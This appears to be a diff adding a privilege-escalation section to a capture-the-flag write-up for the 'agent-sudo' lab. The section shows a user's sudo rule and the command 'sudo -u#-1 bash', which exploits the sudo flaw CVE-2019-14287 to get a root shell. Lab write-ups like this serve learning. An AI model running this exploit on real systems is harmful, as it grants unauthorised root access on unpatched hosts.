@@ -93,6 +93,22 @@ Downloaded the file to my machine
 - Went to https://tineye.com/ > Uploaded the image and in the results I found an article in foxnews.com called "Roswell alien autopsy".
 
 
+## Privilege Escalation
+- Info found about user james:
+```
+User james may run the following commands on agent-sudo:
+(ALL, !root) /bin/bash
+```
+- By running - ``` sudo -u#-1 bash ``` it runs bash as the user with UID -1, which is interpreted as root (UID 0) on some systems, potentially allowing privilege escalation if sudo is misconfigured.
+
+
+reference - https://www.aquasec.com/blog/cve-2019-14287-sudo-linux-vulnerability/
+
+
+![image](https://github.com/user-attachments/assets/780f9ad1-e29e-4126-b601-97eadf3f01a5)
+
+
+
 
 
 
